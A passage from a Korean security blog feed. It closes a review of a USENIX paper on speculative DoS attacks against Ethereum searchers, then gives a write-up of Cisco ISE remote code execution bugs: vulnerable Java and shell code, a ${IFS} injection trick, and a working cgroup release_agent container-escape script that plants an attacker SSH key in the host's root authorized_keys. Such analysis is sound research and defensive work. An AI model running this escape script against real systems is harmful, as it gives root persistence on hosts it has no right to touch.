&#xBB34;&#xD6A8;&#xD654;&#xB418;&#xACE0; Reputation&#xC774; &#xD558;&#xB77D;&#xD558;&#xAC8C; &#xB418;&#xC8E0;</p><p><img src="/2025/08/25/bekim/review/ko/image5.png" alt></p><blockquote><p>Speculative DoS Attacks in Ethereum (USENIX Security 2024): Figure 8: Cost of attacking average searchers with GhostTX</p></blockquote><p>&#xC5F0;&#xAD6C;&#xC9C4;&#xB4E4;&#xC740; &#xC2E4;&#xC81C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; GhostTX &#xACF5;&#xACA9;&#xC758; &#xD6A8;&#xACFC;&#xB97C; &#xD3C9;&#xAC00;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC6B0;&#xC120; &#xC0C1;&#xC704; Searcher&#xB4E4;&#xC758; &#xACBD;&#xC6B0; &#xC57D; 8,240 ETH&#xC758; &#xC774;&#xC775;&#xACFC; 112&#xC5B5; &#xAC00;&#xC2A4; &#xC0AC;&#xC6A9;&#xB7C9;&#xC744; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xC788;&#xC5C8;&#xB294;&#xB370;, &#xC774;&#xB4E4;&#xC744; Reputation &#xC0C1;&#xC704; 50% &#xBC16;&#xC73C;&#xB85C; &#xBC00;&#xC5B4;&#xB0B4;&#xB824;&#xBA74; &#xC57D; 4,249&#xB9CC; &#xB2EC;&#xB7EC;&#xC5D0; &#xB2EC;&#xD558;&#xB294; &#xBE44;&#xC6A9;&#xC774; &#xD544;&#xC694;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBBF8; &#xCDA9;&#xBD84;&#xD788; &#xC790;&#xB9AC;&#xC7A1;&#xC740; <strong>&#xB300;&#xD615; Searcher&#xB97C; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xB108;&#xB728;&#xB9AC;&#xAE30;&#xB294; &#xC0AC;&#xC2E4;&#xC0C1; &#xBD88;&#xAC00;&#xB2A5;&#xD558;&#xC9C0;&#xB9CC; &#xD3C9;&#xADE0; &#xC218;&#xC900;&#xC758; Searcher&#xC5D0; &#xB300;&#xD574;&#xC11C;&#xB294; &#xACB0;&#xACFC;&#xAC00; &#xB2EC;&#xB790;&#xC2B5;&#xB2C8;&#xB2E4;</strong>. </p><p>&#xD3C9;&#xADE0;&#xC801;&#xC73C;&#xB85C; &#xC57D; 0.95 ETH&#xC758; &#xC218;&#xC775;&#xACFC; 328&#xB9CC; &#xAC00;&#xC2A4; &#xC0AC;&#xC6A9;&#xB7C9;, &#xADF8;&#xB9AC;&#xACE0; 2.9&#xD7;10&#xB9;&#xB9; &#xC218;&#xC900;&#xC758; Reputation &#xC810;&#xC218;&#xB97C; &#xAE30;&#xB85D;&#xD558;&#xACE0; &#xC788;&#xB294;&#xB370;, &#xC774;&#xB4E4;&#xC744; &#xD558;&#xC704; 60% &#xC218;&#xC900;&#xC73C;&#xB85C; &#xB04C;&#xC5B4;&#xB0B4;&#xB9AC;&#xB294; &#xB370;&#xC5D0;&#xB294; 9,820&#xB2EC;&#xB7EC;&#xB9CC; &#xC788;&#xC73C;&#xBA74; &#xCDA9;&#xBD84;&#xD558;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;. &#xC989;, GhostTX &#xACF5;&#xACA9;&#xC740; &#xB300;&#xD615; Searcher&#xC5D0;&#xAC8C;&#xB294; &#xC2E4;&#xD589;&#xD558;&#xAE30; &#xC5B4;&#xB835;&#xC9C0;&#xB9CC;, &#xC911;&#xC18C; &#xADDC;&#xBAA8; Searcher&#xB098; &#xC0C8;&#xB86D;&#xAC8C; &#xC9C4;&#xC785;&#xD558;&#xB294; Searcher&#xC5D0;&#xAC8C;&#xB294; &#xC0C1;&#xB300;&#xC801;&#xC73C;&#xB85C; &#xC800;&#xB834;&#xD55C; &#xBE44;&#xC6A9;&#xC73C;&#xB85C;&#xB3C4; Reputation&#xC744; &#xBB34;&#xB108;&#xB728;&#xB9B4; &#xC218; &#xC788;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h1 id="3-&#xB9C8;&#xBB34;&#xB9AC;"><a href="#3-&#xB9C8;&#xBB34;&#xB9AC;" class="headerlink" title="3. &#xB9C8;&#xBB34;&#xB9AC;"></a>3. &#xB9C8;&#xBB34;&#xB9AC;</h1><p>&#xC77C;&#xB2E8; &#xD574;&#xB2F9; &#xB17C;&#xBB38;&#xC758; &#xC800;&#xC790;&#xB4E4;&#xB3C4; &#xC9C0;&#xC801;&#xD588;&#xB4EF;&#xC774;, &#xC81C;&#xC548; &#xACF5;&#xACA9;&#xB4E4;&#xC774; &#xC2E4;&#xC81C; &#xD658;&#xACBD;&#xC5D0;&#xC11C; &#xADF8;&#xB300;&#xB85C; &#xC801;&#xC6A9;&#xB418;&#xAE30;&#xC5D0;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xC81C;&#xC57D;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. ConditionalExhaust &#xAC19;&#xC740; &#xACBD;&#xC6B0;&#xC5D4; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xB9CE;&#xC740; &#xD2B8;&#xB79C;&#xC7AD;&#xC158;&#xC744; &#xB3D9;&#xC2DC;&#xC5D0; &#xD37C;&#xB728;&#xB824;&#xC57C; &#xD6A8;&#xACFC;&#xB97C; &#xADF9;&#xB300;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xACC4;&#xCE35; &#xBE44;&#xC6A9;&#xC774; &#xB9CE;&#xC774; &#xB4E4; &#xC218; &#xC788;&#xACE0;, &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC5B8;&#xAE09;&#xB41C; &#xACF5;&#xACA9; &#xBE44;&#xC6A9;&#xACFC; &#xC2E4;&#xC81C; &#xACF5;&#xACA9; &#xBE44;&#xC6A9;&#xC5D0; &#xCC28;&#xC774;&#xAC00; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC2E4;&#xC81C; &#xC704;&#xD611; &#xC218;&#xC900;&#xC774; &#xD658;&#xACBD;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB974;&#xAC8C; &#xD3C9;&#xAC00;&#xB420; &#xAC83; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xAC1C;&#xC778;&#xC801;&#xC73C;&#xB85C; &#xBA54;&#xC778;&#xB137;&#xC5D0;&#xC11C; &#xC774;&#xAC8C; &#xC5B4;&#xB290;&#xC815;&#xB3C4; &#xD604;&#xC2E4;&#xC801;&#xC778; &#xC704;&#xD611;&#xC774; &#xB420;&#xAE4C; &#xB77C;&#xB294; &#xC758;&#xBB38;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.ConditionalExhaust&#xB098; MemPurge&#xB294; &#xBA54;&#xC778;&#xB137;&#xC744; &#xC0C1;&#xB300;&#xB85C; &#xC704;&#xD611;&#xD558;&#xAE30;&#xC5D4; &#xBB34;&#xB9AC;&#xAC00; &#xC788;&#xC5B4;&#xBCF4;&#xC774;&#xACE0;, &#xC624;&#xD788;&#xB824; GhostTX&#xB294; &#xD604;&#xC2E4;&#xC801;&#xC73C;&#xB85C; &#xC2DC;&#xB3C4; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xC788;&#xB294; &#xACF5;&#xACA9;&#xC77C; &#xAC83; &#xAC19;&#xB124;&#xC694;&#x2026;</p><p>&#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; &#xC774;&#xB7F0; &#xACF5;&#xACA9;&#xB4E4;&#xC5D0; &#xB300;&#xD55C; mitigation&#xB3C4; &#xC81C;&#xC2DC;&#xD558;&#xAE34; &#xD588;&#xC9C0;&#xB9CC;, &#xC77D;&#xC5B4;&#xBCF4;&#xBA74; &#xB300;&#xBD80;&#xBD84; &#xC0AC;&#xC6A9;&#xC790; &#xACBD;&#xD5D8;&#xC744; &#xC545;&#xD654;&#xC2DC;&#xD0A4;&#xAC70;&#xB098; &#xB124;&#xD2B8;&#xC6CC;&#xD06C; &#xD6A8;&#xC728;&#xC744; &#xB5A8;&#xC5B4;&#xB728;&#xB9B4; &#xC218; &#xC788;&#xB294; &#xBD80;&#xBD84;&#xC774; &#xB9CE;&#xC544;&#xC11C; &#xC544;&#xC9C1; &#xC644;&#xBCBD;&#xD55C; &#xD574;&#xACB0;&#xCC45;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xACB0;&#xB860;&#xC801;&#xC73C;&#xB85C;&#xB294; &#xC774;&#xB7F0; &#xACF5;&#xACA9;&#xB4E4;&#xC774; &#xB2F9;&#xC7A5; &#xBA54;&#xC778;&#xB137;&#xC744; &#xB4A4;&#xD754;&#xB4E4;&#xB9CC;&#xD07C;&#xC758; &#xC2E4;&#xC9C8;&#xC801; &#xC704;&#xD611;&#xC740; &#xC544;&#xB2CC; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC; &#xC774;&#xB354;&#xB9AC;&#xC6C0;&#xC758; &#xAD6C;&#xC870;&#xC801; &#xCDE8;&#xC57D;&#xC131;&#xC744; &#xD55C; &#xBC88; &#xC9DA;&#xC5B4;&#xBCFC; &#xC218; &#xC788;&#xC5C8;&#xB358; &#xB17C;&#xBB38;&#xC774; &#xC544;&#xB2CC;&#xAC00; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p>&#xAC11;&#xC791;&#xC2A4;&#xB7EC;&#xC6B4; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;&#xC600;&#xC9C0;&#xB9CC; &#xB05D;&#xAE4C;&#xC9C0; &#xC77D;&#xC5B4;&#xC8FC;&#xC154;&#xC11C; &#xAC10;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;! &#x1F64F; &#xACE7; &#xB354; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xC8FC;&#xC81C;&#xB85C; &#xCC3E;&#xC544;&#xC62C;&#xAC8C;&#xC694;~~</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/bekim/">bekim</category>
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      <category domain="https://hackyboiz.github.io/tags/blockchain/">blockchain</category>
      
      <category domain="https://hackyboiz.github.io/tags/ethereum/">ethereum</category>
      
      <category domain="https://hackyboiz.github.io/tags/usenix/">usenix</category>
      
      <category domain="https://hackyboiz.github.io/tags/Dos/">Dos</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/25/bekim/review/ko/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[하루한줄] CVE-2025-20281/CVE-2025-20337 : Cisco Identity Services Engine의 원격 코드 실행 취약점</title>
      <link>https://hackyboiz.github.io/2025/08/23/poosic/cve-2025-2028,1cve-2025-20337/</link>
      <guid>https://hackyboiz.github.io/2025/08/23/poosic/cve-2025-2028,1cve-2025-20337/</guid>
      <pubDate>Sat, 23 Aug 2025 10:30:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2025/7/24/cv</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><ul><li><a href="https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability">https://www.zerodayinitiative.com/blog/2025/7/24/cve-2025-20281-cisco-ise-api-unauthenticated-remote-code-execution-vulnerability</a></li></ul><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>CVE-2025-20281<ul><li>Cisco ISE &#x2264; 3.3</li><li>Cisco ISE-PIC &#x2264; 3.3</li></ul></li><li>CVE-2025-20282<ul><li>Cisco ISE &#x2264; 3.4</li><li>Cisco ISE-PIC &#x2264; 3.4</li></ul></li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>CVE-2025-20281/CVE-2025-20337&#xC740; Cisco&#xC758; NAC &#xC194;&#xB8E8;&#xC158;, ISE(Identity Service Engine)&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; RCE &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xCDE8;&#xC57D;&#xC810;&#xC740; <code>invokeStrongSwanShellScript</code> &#xBA54;&#xC11C;&#xB4DC;&#xC5D0; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">enableStrongSwanTunnel</span><span class="hljs-params">(HttpServletRequest var1, HttpServletResponse var2)</span> <span class="hljs-keyword">throws</span> ServletException, IOException </span>{        logger.debug(<span class="hljs-string">&quot;Handling enableStrongSwanTunnel request ..&quot;</span>);        <span class="hljs-keyword">try</span> {            logger.debug(<span class="hljs-string">&quot;Enable Native IPSec Tunnel is triggered.&quot;</span>);            ObjectInputStream var3 = <span class="hljs-keyword">new</span> ObjectInputStream(var1.getInputStream()); <span class="hljs-comment">// [1]</span>            String[] var4 = (String[])var3.readObject(); <span class="hljs-comment">// [2]</span>            ...            Process var7 = <span class="hljs-keyword">this</span>.invokeStrongSwanShellScript(var5, var6, <span class="hljs-string">&quot;enable &quot;</span>, var4); <span class="hljs-comment">// [3]</span>            ...        }    }</code></pre><p><code>enableStrongSwanTunnel</code>&#xC758; [1]&#xC5D0;&#xC11C; &#xC544;&#xBB34;&#xB7F0; &#xAC80;&#xC99D;&#xC5C6;&#xC774; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; HTTP &#xC694;&#xCCAD;&#xC744; &#xC77D;&#xC5B4;&#xC635;&#xB2C8;&#xB2E4;.  &#xC774;&#xD6C4; [2]&#xC5D0;&#xC11C; <code>readObject()</code>&#xB97C; &#xD1B5;&#xD574; &#xC5ED;&#xC9C1;&#xB82C;&#xD654; &#xAC1D;&#xCCB4;&#xAC00; &#xC0DD;&#xC131;&#xB429;&#xB2C8;&#xB2E4;.  &#xD574;&#xB2F9; &#xAC1D;&#xCCB4;&#xB294; &#xBCC4;&#xB3C4;&#xC758; &#xAC80;&#xC99D;&#xC5C6;&#xC774;  <code>invokeStrongSwanShellScript()</code>&#xB85C; &#xC804;&#xB2EC;&#xB418;&#xC5B4; &#xC258; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8; &#xC2E4;&#xD589;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">private</span> Process <span class="hljs-title">invokeStrongSwanShellScript</span><span class="hljs-params">(File var1, File var2, String var3, String[] var4)</span> <span class="hljs-keyword">throws</span> IOException, InterruptedException </span>{        ...        String var5 = <span class="hljs-string">&quot;/usr/bin/sudo /opt/CSCOcpm/bin/configureStrongSwan.sh &quot;</span>.concat(var3).concat(var4[<span class="hljs-number">0</span>]); <span class="hljs-comment">// [4]</span>        logger.debug(<span class="hljs-string">&quot;Command is :: {}&quot;</span>, var5);        Process var6 = Runtime.getRuntime().exec(var5);        ...    }</code></pre><p>&#xD638;&#xCD9C;&#xB41C; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xC5ED;&#xC9C1;&#xB82C;&#xD654;&#xB41C; &#xAC1D;&#xCCB4;&#xB294; [4]&#xC5D0;&#xC11C; &#xBCFC; &#xC218; &#xC788;&#xB4EF;&#xC774; <code>configureStrongSwan.sh</code> &#xC758; 2&#xBC88;&#xC9F8; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs bash"><span class="hljs-comment"># configureStrongSwan.sh</span>OPERATION=<span class="hljs-variable">$1</span>IKE_ID=<span class="hljs-string">&quot;<span class="hljs-variable">$2</span>&quot;</span>...<span class="hljs-keyword">elif</span> [ <span class="hljs-string">&quot;<span class="hljs-variable">$OPERATION</span>&quot;</span> == <span class="hljs-string">&quot;enable&quot;</span> ]; <span class="hljs-keyword">then</span>    enableStrongSwan <span class="hljs-string">&quot;<span class="hljs-variable">$IKE_ID</span>&quot;</span> <span class="hljs-comment"># [1]</span><span class="hljs-keyword">fi</span><span class="hljs-function"><span class="hljs-title">enableStrongSwan</span></span>(){  ...  retval=$(verifyIpsecConnectionStatus <span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span>) <span class="hljs-comment"># [2]</span>  ...}<span class="hljs-function"><span class="hljs-title">verifyIpsecConnectionStatus</span></span>(){  cmd=<span class="hljs-string">&quot;swanctl -l --ike &quot;</span>  arg=<span class="hljs-string">&quot;<span class="hljs-variable">$1</span>&quot;</span> <span class="hljs-comment">#</span>  statusCmd=<span class="hljs-string">&quot;<span class="hljs-variable">${cmd}</span><span class="hljs-variable">${arg}</span>&quot;</span> <span class="hljs-comment">#</span>  retval=$(docker <span class="hljs-built_in">exec</span> strongswan-container /bin/bash -c <span class="hljs-string">&quot;<span class="hljs-variable">$statusCmd</span>&quot;</span>) <span class="hljs-comment"># [3]</span>  ...}</code></pre><p>&#xC804;&#xB2EC;&#xB41C; &#xC778;&#xC790;&#xB294; [1]&#xC5D0;&#xC11C; <code>enableStrongSwan</code> &#xD568;&#xC218; &#xC2E4;&#xD589;&#xC5D0; &#xC778;&#xC790;&#xB85C; &#xC0AC;&#xC6A9;&#xB418;&#xACE0; &#xC774;&#xB97C; &#xAC70;&#xCCD0; [2]&#xC5D0;&#xC11C; <code>verifyIpsecConnectionStatus</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xC804;&#xB2EC;&#xB429;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC778;&#xC790;&#xB294; <code>docker exec</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; &#xCEE8;&#xD14C;&#xC774;&#xB108;&#xC548;&#xC5D0;&#xC11C; <code>swanctl -l -like $client_http_reqest</code> &#xD615;&#xD0DC;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; Java&#xC5D0;&#xC11C; string command&#xB97C; <code>exec</code>&#xC758; &#xC778;&#xC790;&#xB85C; &#xB118;&#xACA8;&#xC904; &#xACBD;&#xC6B0; <code>StringTokenizer</code> &#xD074;&#xB798;&#xC2A4;&#xB85C; &#xC9C1;&#xB82C;&#xD654;&#xB418;&#xACE0; , &#xD574;&#xB2F9; &#xD074;&#xB798;&#xC2A4;&#xB294; &#xB530;&#xC634;&#xD45C;&#xB098; &#xC2A4;&#xD398;&#xC774;&#xC2A4;&#xB97C; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC124;&#xACC4; &#xC0C1; &#xD1A0;&#xD06C;&#xB85C; &#xBD84;&#xB9AC;&#xD558;&#xBBC0;&#xB85C; &#xBA85;&#xB839; &#xC804;&#xB2EC; &#xC2DC;  &#xC2A4;&#xD398;&#xC774;&#xC2A4; &#xBB38;&#xC790;&#xB97C; &#xB300;&#xC2E0;&#xD558;&#xC5EC; internal field separator &#xBCC0;&#xC218;&#xC778; <code>${IFS}</code>&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. </p><h3 id="Escaping-Container"><a href="#Escaping-Container" class="headerlink" title="Escaping Container"></a>Escaping Container</h3><pre><code class="hljs bash">mkdir /tmp/escmount -t cgroup -o rdma cgroup /tmp/esc // [1]mkdir /tmp/esc/w<span class="hljs-built_in">echo</span> 1 &gt; /tmp/esc/w/notify_on_releaseoverlay=`sed -n <span class="hljs-string">&apos;s/.*\perdir=\([^,]*\).*/\1/p&apos;</span> /etc/mtab`pop=<span class="hljs-string">&quot;<span class="hljs-variable">$overlay</span>/simulate.sh&quot;</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$pop</span> &gt; /tmp/esc/release_agent // [2]<span class="hljs-built_in">echo</span> \<span class="hljs-comment">#\!/bin/bash &gt; simulate.sh ; echo &quot;mkdir /root/.ssh&quot; &gt;&gt; simulate.sh ; echo &quot;echo &apos;ssh-rsa [public key here] attacker&apos; &gt; /root/.ssh/authorized_keys&quot; &gt;&gt; simulate.sh; chmod +x simulate.sh // [3]</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;0&quot;</span> | tee /tmp/esc/w/cgroup.procs // [4]</code></pre><p>&#xC704;&#xC758; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xD68D;&#xB4DD;&#xD55C; docekr &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xB0B4;&#xBD80; root &#xAD8C;&#xD55C;&#xC744; &#xD1B5;&#xD574; host&#xB85C; container escaping&#xC774; &#xAC00;&#xB2A5;&#xD55C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xB294; 2019 BlackHat&#xC5D0;&#xC11C; &#xBC1C;&#xD45C;&#xB41C; <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">&#x201C;User-Mode Helper&#x201D;</a> &#xAE30;&#xC220;&#xC774; &#xC774;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBA3C;&#xC800; [1]&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xB0B4;&#xBD80;&#xC5D0; <code>/tmp/esc</code> &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xACE0;, &#xC774;&#xACF3;&#xC5D0; &#xB9AC;&#xB205;&#xC2A4; <code>cgroup</code> &#xD30C;&#xC77C; &#xC2DC;&#xC2A4;&#xD15C;&#xC744; &#xB9C8;&#xC6B4;&#xD2B8;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xB2E4;&#xC74C;&#xC73C;&#xB85C; [2] &#xC5D0;&#xC11C;&#xB294;<code>notify_on_release</code> &#xC635;&#xC158;&#xC744; &#xD65C;&#xC131;&#xD654;&#xD558;&#xC5EC; &#xD574;&#xB2F9; cgroup &#xB0B4;&#xC758; &#xBAA8;&#xB4E0; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC885;&#xB8CC;&#xB420; &#xB54C; &#xD2B9;&#xC815; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xB3C4;&#xB85D; &#xC608;&#xC57D;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC2E4;&#xD589;&#xB420; <code>release_agent</code> &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC9C0;&#xC815;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774; &#xACBD;&#xB85C;&#xB294; &#xBC18;&#xB4DC;&#xC2DC; &#xD638;&#xC2A4;&#xD2B8; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xC808;&#xB300; &#xACBD;&#xB85C;&#xC5EC;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;. &#xACF5;&#xACA9;&#xC790;&#xB294; &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xB0B4;&#xBD80; &#xACBD;&#xB85C;&#xAC00; &#xD638;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C; &#xAC00;&#xC9C0;&#xB294; &#xC2E4;&#xC81C; &#xACBD;&#xB85C;&#xB97C; &#xC54C;&#xC544;&#xB0B4;&#xACE0;, &#xC774;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;(<code>simulate.sh</code>)&#xC758; &#xC815;&#xD655;&#xD55C; &#xC704;&#xCE58;&#xB97C; &#xC9C0;&#xC815;&#xD569;&#xB2C8;&#xB2E4;.</p><p>[3] &#xC5D0;&#xC11C;&#xB294; &#xD638;&#xC2A4;&#xD2B8; &#xCEE4;&#xB110;&#xC774; &#xC2E4;&#xD589;&#xD560; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;, <code>simulate.sh</code>&#xB97C; &#xC791;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC774; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC758; &#xB0B4;&#xC6A9;&#xC740; &#xACF5;&#xACA9;&#xC790;&#xC758; SSH &#xACF5;&#xAC1C; &#xD0A4;&#xB97C; &#xD638;&#xC2A4;&#xD2B8;&#xC758; <code>/root/.ssh/authorized_keys</code> &#xD30C;&#xC77C;&#xC5D0; &#xCD94;&#xAC00;&#xD558;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; [4]&#xC5D0;&#xC11C; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;(<code>|</code>)&#xC744; &#xC774;&#xC6A9;&#xD574; <code>tee</code> &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xCF1C; kernel&#xC5D0;&#xC11C; cgroup&#xC744; &#xD1B5;&#xD574; &#xC545;&#xC131; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;  . &#xC774; &#xBA85;&#xB839;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xBA74; <code>tee</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xC544;&#xC8FC; &#xC9E7;&#xC740; &#xC2DC;&#xAC04; &#xB3D9;&#xC548; cgroup&#xC758; &#xC720;&#xC77C;&#xD55C; &#xBA64;&#xBC84;&#xAC00; &#xB418;&#xC5C8;&#xB2E4;&#xAC00; &#xC989;&#xC2DC; &#xC885;&#xB8CC;&#xB429;&#xB2C8;&#xB2E4;. <code>tee</code> &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0AC;&#xB77C;&#xC9C0;&#xBA74;&#xC11C; cgroup&#xC774; &#xBE44;&#xC6CC;&#xC9C0;&#xC790;, <code>notify_on_release</code> &#xAE30;&#xB2A5;&#xC774; &#xC791;&#xB3D9;&#xD558;&#xC5EC; <code>release_agent</code>&#xC5D0; &#xC9C0;&#xC815;&#xB41C; <code>simulate.sh</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xAC00; &#xD638;&#xC2A4;&#xD2B8; &#xCEE4;&#xB110;&#xC5D0; &#xC758;&#xD574; <code>root</code> &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p>Cisco&#xB294; &#xC81C;&#xBCF4;&#xB41C; &#xB450; &#xAC1C;&#xC758; &#xAC1C;&#xBCC4; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xB2E8;&#xC77C; &#xBB38;&#xC81C;&#xB85C; &#xD310;&#xB2E8;&#xD558;&#xC5EC; &#xD558;&#xB098;&#xC758; CVE&#xBC88;&#xD638;(CVE-2025-20281)&#xB9CC;&#xC73C;&#xB85C; &#xD1B5;&#xD569;&#xD558;&#xC5EC; 2025&#xB144; 8&#xC6D4; 5&#xC77C;&#xC5D0; &#xD328;&#xCE58;&#xB97C; &#xBC30;&#xD3EC;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xD6C4; 2025&#xB144;8&#xC6D4; 12&#xC77C;, Cisco&#xB294; &#xAD8C;&#xACE0;&#xBB38;&#xC744; &#xC218;&#xC815;&#xD558;&#xBA70; &#xAE30;&#xC874; &#xC785;&#xC7A5;&#xC744; &#xBC88;&#xBCF5;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. Cisco&#xB294; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC0C8;&#xB85C;&#xC6B4; &#xC2DD;&#xBCC4;&#xBC88;&#xD638;&#xC778; CVE-2025-20337&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0;, &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD55C; &#xCD94;&#xAC00; &#xD328;&#xCE58;&#xB97C; &#xBC1C;&#xD45C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">&#x201C;User-Mode Helper&#x201D; BlackHat 